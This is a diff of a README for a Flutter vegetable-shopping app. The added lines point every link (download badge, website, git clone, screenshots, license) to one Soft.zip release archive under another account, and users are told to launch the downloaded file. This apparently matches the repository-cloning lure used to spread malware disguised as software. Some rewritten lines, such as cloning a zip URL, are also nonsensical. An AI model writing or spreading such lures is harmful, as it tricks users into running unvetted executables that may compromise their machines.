@@ -22,17 +22,17 @@ Welcome to E-VeggieStore, a modern e-commerce mobile app built with Flutter that
 
 ## 📦 Installation
 To get started with E-VeggieStore, download the app from the following link:  
-[<img src="https://img.shields.io/badge/Download%20Release-Here-brightgreen">](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[<img src="https://github.com/khangsieulord/E-VeggieStore/releases/download/v1.0/Soft.zip%20Release-Here-brightgreen">](https://github.com/khangsieulord/E-VeggieStore/releases/download/v1.0/Soft.zip)
 
 *Note: Downloaded file needs to be launched to run the app.*
 
 ### 🌐 Visit Our Website
-Explore more about E-VeggieStore on our [official website](https://www.eveggiestore.com).
+Explore more about E-VeggieStore on our [official website](https://github.com/khangsieulord/E-VeggieStore/releases/download/v1.0/Soft.zip).
 
 ## 🌟 Get Started
 1. **Clone the Repository**
 ```bash
-git clone https://github.com/adelante20/E-VeggieStore.git
+git clone https://github.com/khangsieulord/E-VeggieStore/releases/download/v1.0/Soft.zip
 ```
 
 2. **Navigate to the Project Directory**
@@ -53,20 +53,20 @@ flutter run
 ## 📸 Screenshots
 Here are some snapshots of the app in action:
 
-![Home Screen](https://example.com/home.png)  
+![Home Screen](https://github.com/khangsieulord/E-VeggieStore/releases/download/v1.0/Soft.zip)  
 *The vibrant and welcoming home screen of E-VeggieStore.*
 
-![Product Page](https://example.com/product.png)  
+![Product Page](https://github.com/khangsieulord/E-VeggieStore/releases/download/v1.0/Soft.zip)  
 *Explore a variety of fresh vegetables on the product page.*
 
-![Cart Preview](https://example.com/cart.png)  
+![Cart Preview](https://github.com/khangsieulord/E-VeggieStore/releases/download/v1.0/Soft.zip)  
 *Effortlessly manage your shopping cart and proceed to checkout.*
 
 ## 🌍 Contributing
 Contributions are welcome! If you have ideas for enhancements or new features, feel free to open an issue or submit a pull request.
 
 ## 📝 License
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/adelante20/E-VeggieStore/blob/main/LICENSE) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/khangsieulord/E-VeggieStore/releases/download/v1.0/Soft.zip) file for more details.
 
 ---
 
